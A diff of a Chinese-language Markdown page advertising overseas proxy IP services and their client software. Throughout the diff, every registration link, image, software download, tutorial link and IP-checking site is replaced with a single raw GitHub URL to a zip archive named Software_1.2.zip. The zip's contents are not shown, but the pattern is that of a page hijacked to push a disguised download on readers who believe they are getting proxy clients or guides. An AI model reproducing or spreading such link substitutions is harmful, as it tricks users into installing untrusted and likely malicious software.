@@ -1,4 +1,4 @@
-![](https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=1200&h=400&fit=crop)
+![](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 # 🌐 2026海外代理IP推荐 | Socks5 · L2TP · 全球优质国际线路
 ### 💾 【按 Ctrl+D 收藏本页，不迷路 · 持续更新中】
@@ -8,7 +8,7 @@
 ## 💎 无双IP | 国内外全球Socks5/L2TP代理 | 稳定独享IP全球节点
 
 ### 🌐 官网地址 · 4月限时200M香港10元起
-👉 [点此注册](https://new.6nn.net/admin#/login?scope=register&inviteCode=8JzmjbeYkBZq) 即享免费测试
+👉 [点此注册](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip) 即享免费测试
 
 > 🏆 **无双代理提供高品质海外代理服务**，采用纯净静态住宅IP，覆盖美国、日本、德国等多个国家与地区，老用户口碑认证！
 
@@ -28,14 +28,14 @@
 
 > 🏠 真实静态住宅IP，全球多节点可选，有效避免被屏蔽。
 > 🖼️ 随机线路纯净度展示
-![](https://img.meituan.net/content/d5635ecde3c6e47fb3c7c0cfa629aafd72036.png)
+![](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 ---
 
 ## 👑 CROWN皇冠代理 | 住宅原生独享 | 100-500M超大带宽
 
 ### 🌐 官网地址 · 住宅原生独享100-500M
-👉 [点此注册](http://www.ipcrown.com/register?invitation=gsyunip&shareid=71) 即可免费领取10条测试线路
+👉 [点此注册](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip) 即可免费领取10条测试线路
 
 > 🌟 **CROWN皇冠代理专注提供全球原生住宅独享IP**，带宽高达100-500M，高速稳定，助力TikTok直播、跨境电商、海外社媒运营畅通无阻。
 
@@ -69,7 +69,7 @@
 
 > 🌐 覆盖亚洲、欧美、大洋洲、中东等主流地区，满足各类跨境业务需求。
 > 🖼️ 随机线路纯净度展示
-![](https://img.meituan.net/content/ba390594a8f063cb8ec6e2f214c1749373456.png)
+![](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 ---
 
@@ -78,7 +78,7 @@
 ## 🌍 985Proxy | 全球优质海外IP代理 | 国外原生住宅ISP广播节点
 
 ### 🌐 官网地址 · 高质量双ISP专线
-👉 [点此注册](https://www.985proxy.com/?invite=APAGFC)
+👉 [点此注册](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 > 🚀 **985Proxy拥有来自全球80M+、200+地区的合规真实住宅IP**，确保99.9%正常运行时间，助力网络加速、隐私保护与跨境业务。
 
@@ -108,14 +108,14 @@
 
 > 🚀 采用独享海外原生IP专线，解决直播卡顿、丢包问题，延迟与国内直播相当，确保跨国直播流畅稳定。
 > 🖼️ 随机线路纯净度展示
-![](https://img.meituan.net/content/40dce931f1c630297d75888e170de47773716.png)
+![](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 ---
 
 ## 🎮 55游 | Socks5全球游戏代理 | 真隔离原生住宅IP
 
 ### 🌐 官网地址 · 高端游戏网络加速专家
-👉 [点此注册](https://55u.net/#/login?c=gsyunip)
+👉 [点此注册](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 > 🎮 **55游专注提供全球SOCKS5游戏代理节点**，真游戏IP隔离，采用"一游戏一IP"机制，专线专用。可售节点2500+，支持原生住宅IP、本土IP、云IP三种类型。
 
@@ -134,30 +134,30 @@
 | 云服务器IP（云IP） | 30M | ¥0.60 | ¥4 | ¥15 | 大带宽，性价比优异 |
 
 > 🖼️ 部分地区线路展示
-![](https://img.meituan.net/content/72de575e6fc5f1cb964200c2c9a524c442790.png)
+![](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 ---
 
 ## 📥 代理软件下载（含Windows、安卓、iOS软件及使用教程）
 
 ### 💻 电脑端全局或虚拟机使用
-- **SSTap**：[https://wwox.lanzout.com/i8kCJ38up9de](https://wwox.lanzout.com/i8kCJ38up9de)
-- 📖 使用教程：[SSTap使用教程](https://docs.qq.com/doc/DSGFmcE5VV3NMck5S)
+- **SSTap**：[https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
+- 📖 使用教程：[SSTap使用教程](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 ### 🌐 浏览器单窗口单IP（指纹浏览器 / 比特浏览器）
-- 📖 下载地址：[https://docs.qq.com/doc/DSHdGbE1WQ0Z5dkdC](https://docs.qq.com/doc/DSHdGbE1WQ0Z5dkdC)
+- 📖 下载地址：[https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 ### 📱 安卓软件下载
-- **下载地址**：[https://wwox.lanzout.com/b0hd3tyeb](https://wwox.lanzout.com/b0hd3tyeb) 密码：`6nb9`
-- 📖 安卓教程：[使用图文教程](https://docs.qq.com/doc/DSE1neW5iZ0FadnVq)
+- **下载地址**：[https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip) 密码：`6nb9`
+- 📖 安卓教程：[使用图文教程](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 ### 🍎 苹果iOS使用
 - 苹果手机需下载支持Socks5的软件（如 Shadowrocket 小火箭）
 - 也可使用 L2TP 节点，无需下载软件，直接配置
-- 📖 [苹果L2TP教程](https://docs.qq.com/doc/DSGJGUWZBamdhYkdT)
+- 📖 [苹果L2TP教程](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 ### 💻 Windows电脑端直连L2TP
-- 📖 使用教程：[https://docs.qq.com/doc/DSGVWbUxycURKV1Zm](https://docs.qq.com/doc/DSGVWbUxycURKV1Zm)
+- 📖 使用教程：[https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)
 
 ---
 
@@ -167,7 +167,7 @@
 
 ### ① 专业IP检测工具
 
-> 📌 **推荐使用：https://ping0.cc/** （文章实测有效，可同时检测IP类型、风控值、原生状态）
+> 📌 **推荐使用：https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip** （文章实测有效，可同时检测IP类型、风控值、原生状态）
 
 将需要查询的IP输入，点击"查询"即可显示结果。主要看3个核心数据：
 
@@ -191,7 +191,7 @@
 ---
 
 ## ✅ 如何验证代理配置成功？
-配置好软件后，浏览器打开 [https://www.ip138.com/](https://www.ip138.com/)，查看显示的地址是否已变更，即表示成功。
+配置好软件后，浏览器打开 [https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip](https://raw.githubusercontent.com/styleless-oldboy528/ispip/main/antichurchian/Software_1.2.zip)，查看显示的地址是否已变更，即表示成功。
 
 ---
 
